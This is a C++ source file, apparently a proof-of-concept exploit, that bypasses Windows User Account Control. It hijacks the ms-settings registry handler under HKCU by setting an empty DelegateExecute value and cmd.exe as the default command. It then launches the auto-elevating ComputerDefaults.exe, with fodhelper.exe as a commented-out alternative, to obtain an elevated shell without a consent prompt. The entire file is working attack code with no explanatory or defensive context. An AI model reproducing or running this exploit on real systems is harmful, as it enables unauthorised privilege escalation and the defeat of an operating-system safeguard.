// Filename: computerdefaults_fodhelper_poc.cpp
// Author: CyberTrashPanda 

#include <iostream>
#include <Windows.h>


bool spawnProcess(const char * path) {
    SHELLEXECUTEINFOA shInfo = { 0 };
    shInfo.cbSize = sizeof(shInfo);
    shInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shInfo.hwnd = 0;
    shInfo.lpFile = path;
    std::cout << "[ ] Spawning executable using '" << path << "'.\n";
    if (ShellExecuteExA(&shInfo))
    {
        WaitForSingleObject(shInfo.hProcess, INFINITE);
        CloseHandle(shInfo.hProcess);
        return true;
    }
    return false;
}

void writeRegistry() {
    std::string reg_delegate = "DelegateExecute";
    std::string payload_path = "C:\\Windows\\System32\\cmd.exe";
    HKEY hKey;
    
    long res = RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (ERROR_SUCCESS != res){
        std::cerr << "[-] Can't create key 'HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command'.\n";
        exit(0);   
    }else
        std::cout << "[+] Registry key 'HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command' created.\n";
    res = RegSetValueExA(hKey, reg_delegate.c_str(), 0, REG_SZ, (LPBYTE)"", 1);
    if (ERROR_SUCCESS != res){
        std::cerr << "[-] Can't write key 'HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command\\DelegateExecute'.\n";
        exit(0);
    }else
        std::cout << "[+] Registry key 'HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command\\DelegateExecute' created.\n";
    res = RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)payload_path.c_str(), strlen(payload_path.c_str()) + 1);
    if (ERROR_SUCCESS != res){
        std::cerr << "[-] Can't write key 'HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command\\(default)'.\n";
        exit(0);
    }else
        std::cout << "[+] Registry key 'HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command\\(default)' created.\n";
}



int main()
{
    writeRegistry();
    std::string auto_exe = "C:\\Windows\\System32\\ComputerDefaults.exe";
    //std::string auto_exe = "C:\\Windows\\System32\\fodhelper.exe";

    spawnProcess(auto_exe.c_str());


}
